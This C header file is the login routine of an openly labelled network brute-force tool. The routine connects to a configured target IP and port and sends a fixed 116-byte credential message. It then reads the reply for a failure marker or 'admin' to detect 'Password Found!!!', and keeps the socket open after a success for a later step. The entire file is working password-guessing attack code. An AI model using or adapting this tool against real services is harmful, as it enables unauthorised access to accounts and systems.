/******************************************************************************
*  @file tcp_login.h
*  @brief Generic Network Brute-force 
*  @version: 2.0.2
*  @author: Ara Khachatryan 
*..............................................................................
*  @param login_data is an autentification information (login and password)
*         of specified target. Array length: 116, type: unsigned char
*  @param FCN_msg is an container for storing tcp_login()'s status messages 
*  @return type: short int
*  @retval -1  when error occurred
*  @retval  0  when password not match
*  @retval  1  when password is found
*  @retval  2  when second reply from target not recognized
*..............................................................................
*  @brief DEBUG_MODE, IP_ADDRESS, PORT_NUMBER parameters defined in tcp_brute.c
*         file
*..............................................................................
*  @brief Exact lenght of first reply message from target is 564
*         Exact length of the message to be sent to target is 116
*         Exact lenght of second reply message from target is 68 if login fail 
*               and 100 or 136 if login sucess, so define the max lenght 136
*..............................................................................
*  @brief debug_FCN() function for mesuare tcp_login()'s operation time and set
*         status message into FCN_msg
******************************************************************************/

#ifndef TCP_LOGIN_H
#define TCP_LOGIN_H

#include <stdio.h> /* standard input/output library, for perror() */
#include <string.h> /* string functions, for strcpy(), strcat(), memset() */
#include <stdlib.h> /* dynamic memory management, for calloc() */
#include <stdbool.h> /* for supporting bool type */
#include <sys/time.h> /* defines the timeval structure, for gettimeofday() */
#include <sys/socket.h> /* Core BSD socket functions and data structures */
#include <arpa/inet.h> /* for manipulating IP addresses, for inet_addr() */
#include <unistd.h> /* access to the POSIX operating system API, for close() */
#include <sys/fcntl.h> /* for the non-blocking socket */
#include <sys/select.h>

#include "search_hex_data.h" /* function for searching hex data in message */



short int tcp_login( unsigned char* login_data, char* FCN_msg );
void debug_FCN( struct timeval t1, char* FCN_msg, char* custom_msg );



short int tcp_login( unsigned char* login_data, char* FCN_msg )
{
	struct timeval t1;
	
	if ( DEBUG_MODE ) {
		gettimeofday(&t1, NULL);
	}

	int socket_desc;
	struct sockaddr_in target;
	
	/* Create socket */
	socket_desc = socket( AF_INET , SOCK_STREAM , IPPROTO_TCP );
	if ( socket_desc == -1 ) {
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "socket(): ");
		}
		return -1;
	}
	
	/* Change the socket into non-blocking state */
	fcntl(socket_desc, F_SETFL, O_NONBLOCK);

	/* Set remote target information */
	target.sin_addr.s_addr = inet_addr( IP_ADDRESS );
	target.sin_family = AF_INET;
	target.sin_port = htons( PORT_NUMBER );
	

	/****************************************************************************
	* Connect to remote target
	* If the connection or binding succeeds, 0 returned, otherwise -1
	****************************************************************************/
	if (connect(socket_desc, (struct sockaddr *)&target, sizeof(target)) == -1) {
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "connect(): ");
		}
		return -1;
	}


	unsigned char *tcp_reply_first;
	tcp_reply_first = (unsigned char *)calloc(564, sizeof(unsigned char));
	unsigned char *tcp_reply_second;
	tcp_reply_second = (unsigned char *)calloc(136, sizeof(unsigned char));


	/****************************************************************************
	* Receive first reply from the target
	* recv() returns the length of the message on successful completion
	* Exact lenght of first reply message from target is 564
	* message contains information about the target
	****************************************************************************/
	if ( recv(socket_desc, tcp_reply_first, 564 , MSG_WAITALL ) == -1 ) {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "first recv(): ");
		}
		return -1;
	}

	/****************************************************************************
	* Send login_data to the target
	* send() on success return the number of bytes sent
	* Тhe exact length of the message to be sent is 116
	****************************************************************************/
	if ( send(socket_desc , login_data , 116 , MSG_CONFIRM ) == -1 ) {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "send(): ");
		}	
		return -1;
	}

	/****************************************************************************
	* Receive second reply from the target
	* recv() returns the length of the message on successful completion
	* Exact lenght of second reply message from target is 68
	****************************************************************************/
	size_t l = 0;
	if ( (l = recv(socket_desc, tcp_reply_second, 136, MSG_PEEK)) == -1 ) {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "second recv(): ");
		}
		return -1;
	}

	/****************************************************************************
	* If in second reply from target "COMMAND_LOGIN_FAIL" found, passsword not
	* match return 0, otherwize password found return 1
	****************************************************************************/
	if ( search_hex_data(tcp_reply_second, l, COMMAND_LOGIN_FAIL, 18) ) {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		close(socket_desc);
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "password not match, no errors");
		}
		return 0;
	/* Password Found!!! */
	} else  if ( search_hex_data(tcp_reply_second, l, admin, 5) ) {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "\x1B[1;31mPassword Found!!!");
		}
		/* dont close socket in this case for next step */
		return 1;
	/* tcp_reply_second not recognized */
	} else {
		free( tcp_reply_first ) ;
		free( tcp_reply_second );
		if ( DEBUG_MODE ) {
			debug_FCN(t1, FCN_msg, "\x1B[1;34mdsecond reply not recognized");
		}
		return 2;
	}

}



void debug_FCN( struct timeval t1, char* FCN_msg, char *custom_msg )
{
	if ( errno ) {
		strcat(FCN_msg, "\x1B[1;34m"); /* set bold and blue */
		strcat(FCN_msg, custom_msg);
		strcat(FCN_msg, "\x1B[1;31m"); /* set bold and red */
		strcat(FCN_msg, strerror(errno));
		
	} else {
		strcat(FCN_msg, "\x1B[1;32m"); /* set bold and green */
		strcat(FCN_msg, custom_msg);
	}

	struct timeval t2, t;

	gettimeofday(&t2, NULL);
	timersub(&t2, &t1, &t); /* mesure time between t1 and t2 assign to t */
	int dt = t.tv_sec*1000 + t.tv_usec/1000; /* dt is elapsed time in ms */

	strcat(FCN_msg, "\x1B[72G"); /* move cursor to 72th column */
	strcat(FCN_msg, "\x1B[1;36m"); /* set bold and cyan */

	sprintf(FCN_msg, "%s %4d ms", FCN_msg, dt);

	strcat(FCN_msg, "\x1B[0m"); /* reset all ASCII text attributes */
}


#endif /* TCP_LOGIN_H */
